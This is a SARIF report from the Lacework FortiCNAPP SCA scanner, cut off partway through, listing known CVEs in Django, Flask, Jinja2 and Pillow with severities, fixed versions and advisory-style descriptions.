{
  "version": "2.1.0",
  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
  "runs": [
    {
      "tool": {
        "driver": {
          "fullName": "Lacework FortiCNAPP SCA",
          "informationUri": "https://www.lacework.com/",
          "name": "Lacework FortiCNAPP SCA",
          "rules": [
            {
              "id": "CVE-2020-7471",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-7471"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471",
              "help": {
                "text": "Vulnerability CVE-2020-7471\nSeverity: critical\nFixed Version: 1.11.28\nLink: [CVE-2020-7471](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471)\nDjango 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg instance, it was possible to break escaping and inject malicious SQL.",
                "markdown": "**Vulnerability CVE-2020-7471**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|1.11.28|[CVE-2020-7471](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471)|\n\nDjango 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg instance, it was possible to break escaping and inject malicious SQL."
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2020-9402",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-9402"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9402",
              "help": {
                "text": "Vulnerability CVE-2020-9402\nSeverity: high\nFixed Version: 1.11.29\nLink: [CVE-2020-9402](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9402)\nDjango 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.",
                "markdown": "**Vulnerability CVE-2020-9402**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.11.29|[CVE-2020-9402](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9402)|\n\nDjango 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-33203",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-33203"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33203",
              "help": {
                "text": "Vulnerability CVE-2021-33203\nSeverity: medium\nFixed Version: 2.2.24\nLink: [CVE-2021-33203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33203)\nDjango before 2.2.24, 3.x before 3.1.12, and 3.2.x before 3.2.4 has a potential directory traversal via django.contrib.admindocs. Staff members could use the TemplateDetailView view to check the existence of arbitrary files. Additionally, if (and only if) the default admindocs templates have been customized by application developers to also show file contents, then not only the existence but also the file contents would have been exposed. In other words, there is directory traversal outside of the template root directories.",
                "markdown": "**Vulnerability CVE-2021-33203**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.2.24|[CVE-2021-33203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33203)|\n\nDjango before 2.2.24, 3.x before 3.1.12, and 3.2.x before 3.2.4 has a potential directory traversal via django.contrib.admindocs. Staff members could use the TemplateDetailView view to check the existence of arbitrary files. Additionally, if (and only if) the default admindocs templates have been customized by application developers to also show file contents, then not only the existence but also the file contents would have been exposed. In other words, there is directory traversal outside of the template root directories."
              },
              "properties": {
                "security-severity": "4.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36359",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36359"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36359",
              "help": {
                "text": "Vulnerability CVE-2022-36359\nSeverity: high\nFixed Version: 4.0.7\nLink: [CVE-2022-36359](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36359)\nAn issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.",
                "markdown": "**Vulnerability CVE-2022-36359**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|4.0.7|[CVE-2022-36359](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36359)|\n\nAn issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2024-45231",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-45231"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45231",
              "help": {
                "text": "Vulnerability CVE-2024-45231\nSeverity: medium\nFixed Version: 5.1.1\nLink: [CVE-2024-45231](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45231)\nAn issue was discovered in Django v5.1.1, v5.0.9, and v4.2.16. The django.contrib.auth.forms.PasswordResetForm class, when used in a view implementing password reset flows, allows remote attackers to enumerate user e-mail addresses by sending password reset requests and observing the outcome (only when e-mail sending is consistently failing).",
                "markdown": "**Vulnerability CVE-2024-45231**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|5.1.1|[CVE-2024-45231](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45231)|\n\nAn issue was discovered in Django v5.1.1, v5.0.9, and v4.2.16. The django.contrib.auth.forms.PasswordResetForm class, when used in a view implementing password reset flows, allows remote attackers to enumerate user e-mail addresses by sending password reset requests and observing the outcome (only when e-mail sending is consistently failing)."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2023-30861",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-30861"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30861",
              "help": {
                "text": "Vulnerability CVE-2023-30861\nSeverity: high\nFixed Version: 2.3.2\nLink: [CVE-2023-30861](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30861)\nWhen all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by a proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client`s `session` cookie to other clients. The severity depends on the application`s use of the session, and the proxy`s behavior regarding cookies. The risk depends on _all_ these conditions being met.\n\n1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.\n2. The application sets [`session.permanent = True`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.session.permanent).\n2. The application does not access or modify the session at any point during a request.\n4. [`SESSION_REFRESH_EACH_REQUEST`](https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_REFRESH_EACH_REQUEST) is enabled (the default).\n5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.\n\nThis happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified.",
                "markdown": "**Vulnerability CVE-2023-30861**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.3.2|[CVE-2023-30861](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30861)|\n\nWhen all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by a proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client`s `session` cookie to other clients. The severity depends on the application`s use of the session, and the proxy`s behavior regarding cookies. The risk depends on _all_ these conditions being met.\n\n1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.\n2. The application sets [`session.permanent = True`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.session.permanent).\n2. The application does not access or modify the session at any point during a request.\n4. [`SESSION_REFRESH_EACH_REQUEST`](https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_REFRESH_EACH_REQUEST) is enabled (the default).\n5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.\n\nThis happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2019-10906",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2019-10906"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10906",
              "help": {
                "text": "Vulnerability CVE-2019-10906\nSeverity: high\nFixed Version: 2.10.1\nLink: [CVE-2019-10906](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10906)\nIn Pallets Jinja before 2.10.1, `str.format_map` allows a sandbox escape.\n\nThe sandbox is used to restrict what code can be evaluated when rendering untrusted, user-provided templates. Due to the way string formatting works in Python, the `str.format_map` method could be used to escape the sandbox.\n\nThis issue was previously addressed for the `str.format` method in Jinja 2.8.1, which discusses the issue in detail. However, the less-common `str.format_map` method was overlooked. This release applies the same sandboxing to both methods.\n\nIf you cannot upgrade Jinja, you can override the `is_safe_attribute` method on the sandbox and explicitly disallow the `format_map` method on string objects.",
                "markdown": "**Vulnerability CVE-2019-10906**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.10.1|[CVE-2019-10906](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10906)|\n\nIn Pallets Jinja before 2.10.1, `str.format_map` allows a sandbox escape.\n\nThe sandbox is used to restrict what code can be evaluated when rendering untrusted, user-provided templates. Due to the way string formatting works in Python, the `str.format_map` method could be used to escape the sandbox.\n\nThis issue was previously addressed for the `str.format` method in Jinja 2.8.1, which discusses the issue in detail. However, the less-common `str.format_map` method was overlooked. This release applies the same sandboxing to both methods.\n\nIf you cannot upgrade Jinja, you can override the `is_safe_attribute` method on the sandbox and explicitly disallow the `format_map` method on string objects."
              },
              "properties": {
                "security-severity": "8.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-28493",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-28493"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28493",
              "help": {
                "text": "Vulnerability CVE-2020-28493\nSeverity: medium\nFixed Version: 2.11.3\nLink: [CVE-2020-28493](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28493)\nThis affects the package jinja2 from 0.0.0 and before 2.11.3. The ReDOS vulnerability of the regex is mainly due to the sub-pattern [a-zA-Z0-9._-]+.[a-zA-Z0-9._-]+ This issue can be mitigated by Markdown to format user content instead of the urlize filter, or by implementing request timeouts and limiting process memory.",
                "markdown": "**Vulnerability CVE-2020-28493**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.11.3|[CVE-2020-28493](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28493)|\n\nThis affects the package jinja2 from 0.0.0 and before 2.11.3. The ReDOS vulnerability of the regex is mainly due to the sub-pattern [a-zA-Z0-9._-]+.[a-zA-Z0-9._-]+ This issue can be mitigated by Markdown to format user content instead of the urlize filter, or by implementing request timeouts and limiting process memory."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2024-22195",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-22195"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22195",
              "help": {
                "text": "Vulnerability CVE-2024-22195\nSeverity: medium\nFixed Version: 3.1.3\nLink: [CVE-2024-22195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22195)\nThe `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.",
                "markdown": "**Vulnerability CVE-2024-22195**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|3.1.3|[CVE-2024-22195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22195)|\n\nThe `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix."
              },
              "properties": {
                "security-severity": "5.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2024-34064",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-34064"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34064",
              "help": {
                "text": "Vulnerability CVE-2024-34064\nSeverity: medium\nFixed Version: 3.1.4\nLink: [CVE-2024-34064](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34064)\nThe `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `\u003e`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
                "markdown": "**Vulnerability CVE-2024-34064**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|3.1.4|[CVE-2024-34064](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34064)|\n\nThe `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `\u003e`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe."
              },
              "properties": {
                "security-severity": "5.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2024-56326",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-56326"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56326",
              "help": {
                "text": "Vulnerability CVE-2024-56326\nSeverity: medium\nFixed Version: 3.1.5\nLink: [CVE-2024-56326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56326)\nAn oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja`s sandbox does catch calls to `str.format` and ensures they don`t escape the sandbox. However, it`s possible to store a reference to a malicious string`s `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",
                "markdown": "**Vulnerability CVE-2024-56326**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|3.1.5|[CVE-2024-56326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56326)|\n\nAn oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja`s sandbox does catch calls to `str.format` and ensures they don`t escape the sandbox. However, it`s possible to store a reference to a malicious string`s `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2025-27516",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2025-27516"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-27516",
              "help": {
                "text": "Vulnerability CVE-2025-27516\nSeverity: medium\nFixed Version: 3.1.6\nLink: [CVE-2025-27516](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-27516)\nAn oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja`s sandbox does catch calls to `str.format` and ensures they don`t escape the sandbox. However, it`s possible to use the `|attr` filter to get a reference to a string`s plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment`s attribute lookup.",
                "markdown": "**Vulnerability CVE-2025-27516**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|3.1.6|[CVE-2025-27516](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-27516)|\n\nAn oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja`s sandbox does catch calls to `str.format` and ensures they don`t escape the sandbox. However, it`s possible to use the `|attr` filter to get a reference to a string`s plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment`s attribute lookup."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2019-19911",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2019-19911"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19911",
              "help": {
                "text": "Vulnerability CVE-2019-19911\nSeverity: high\nFixed Version: 6.2.2\nLink: [CVE-2019-19911](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19911)\nThere is a DoS vulnerability in Pillow before 6.2.2 caused by FpxImagePlugin.py calling the range function on an unvalidated 32-bit integer if the number of bands is large. On Windows running 32-bit Python, this results in an OverflowError or MemoryError due to the 2 GB limit. However, on Linux running 64-bit Python this results in the process being terminated by the OOM killer.",
                "markdown": "**Vulnerability CVE-2019-19911**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|6.2.2|[CVE-2019-19911](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19911)|\n\nThere is a DoS vulnerability in Pillow before 6.2.2 caused by FpxImagePlugin.py calling the range function on an unvalidated 32-bit integer if the number of bands is large. On Windows running 32-bit Python, this results in an OverflowError or MemoryError due to the 2 GB limit. However, on Linux running 64-bit Python this results in the process being terminated by the OOM killer."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-5313",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-5313"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5313",
              "help": {
                "text": "Vulnerability CVE-2020-5313\nSeverity: high\nFixed Version: 6.2.2\nLink: [CVE-2020-5313](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5313)\n`libImaging/FliDecode.c` in Pillow before 6.2.2 has an FLI buffer overflow.",
                "markdown": "**Vulnerability CVE-2020-5313**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|6.2.2|[CVE-2020-5313](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5313)|\n\n`libImaging/FliDecode.c` in Pillow before 6.2.2 has an FLI buffer overflow."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-5312",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-5312"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5312",
              "help": {
                "text": "Vulnerability CVE-2020-5312\nSeverity: critical\nFixed Version: 6.2.2\nLink: [CVE-2020-5312](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5312)\nlibImaging/PcxDecode.c in Pillow before 6.2.2 has a PCX P mode buffer overflow.",
                "markdown": "**Vulnerability CVE-2020-5312**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|6.2.2|[CVE-2020-5312](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5312)|\n\nlibImaging/PcxDecode.c in Pillow before 6.2.2 has a PCX P mode buffer overflow."
              },
              "properties": {
                "security-severity": "9.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2020-5310",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-5310"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5310",
              "help": {
                "text": "Vulnerability CVE-2020-5310\nSeverity: critical\nFixed Version: 6.2.2\nLink: [CVE-2020-5310](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5310)\n`libImaging/TiffDecode.c` in Pillow before 6.2.2 has a TIFF decoding integer overflow, related to realloc.",
                "markdown": "**Vulnerability CVE-2020-5310**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|6.2.2|[CVE-2020-5310](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5310)|\n\n`libImaging/TiffDecode.c` in Pillow before 6.2.2 has a TIFF decoding integer overflow, related to realloc."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2020-11538",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-11538"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11538",
              "help": {
                "text": "Vulnerability CVE-2020-11538\nSeverity: critical\nFixed Version: 7.1.0\nLink: [CVE-2020-11538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11538)\nIn libImaging/SgiRleDecode.c in Pillow through 7.0.0, a number of out-of-bounds reads exist in the parsing of SGI image files, a different issue than CVE-2020-5311.",
                "markdown": "**Vulnerability CVE-2020-11538**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|7.1.0|[CVE-2020-11538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11538)|\n\nIn libImaging/SgiRleDecode.c in Pillow through 7.0.0, a number of out-of-bounds reads exist in the parsing of SGI image files, a different issue than CVE-2020-5311."
              },
              "properties": {
                "security-severity": "8.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2020-10994",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-10994"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10994",
              "help": {
                "text": "Vulnerability CVE-2020-10994\nSeverity: high\nFixed Version: 7.1.0\nLink: [CVE-2020-10994](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10994)\nIn `libImaging/Jpeg2KDecode.c` in Pillow before 7.1.0, there are multiple out-of-bounds reads via a crafted JP2 file.",
                "markdown": "**Vulnerability CVE-2020-10994**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|7.1.0|[CVE-2020-10994](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10994)|\n\nIn `libImaging/Jpeg2KDecode.c` in Pillow before 7.1.0, there are multiple out-of-bounds reads via a crafted JP2 file."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-10378",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-10378"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10378",
              "help": {
                "text": "Vulnerability CVE-2020-10378\nSeverity: high\nFixed Version: 7.1.0\nLink: [CVE-2020-10378](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10378)\nIn `libImaging/PcxDecode.c` in Pillow before 7.1.0, an out-of-bounds read can occur when reading PCX files where `state-\u003eshuffle` is instructed to read beyond `state-\u003ebuffer`.",
                "markdown": "**Vulnerability CVE-2020-10378**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|7.1.0|[CVE-2020-10378](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10378)|\n\nIn `libImaging/PcxDecode.c` in Pillow before 7.1.0, an out-of-bounds read can occur when reading PCX files where `state-\u003eshuffle` is instructed to read beyond `state-\u003ebuffer`."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-10177",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-10177"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10177",
              "help": {
                "text": "Vulnerability CVE-2020-10177\nSeverity: high\nFixed Version: 7.1.0\nLink: [CVE-2020-10177](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10177)\nPillow before 7.1.0 has multiple out-of-bounds reads in `libImaging/FliDecode.c`.",
                "markdown": "**Vulnerability CVE-2020-10177**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|7.1.0|[CVE-2020-10177](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10177)|\n\nPillow before 7.1.0 has multiple out-of-bounds reads in `libImaging/FliDecode.c`."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-10379",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-10379"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10379",
              "help": {
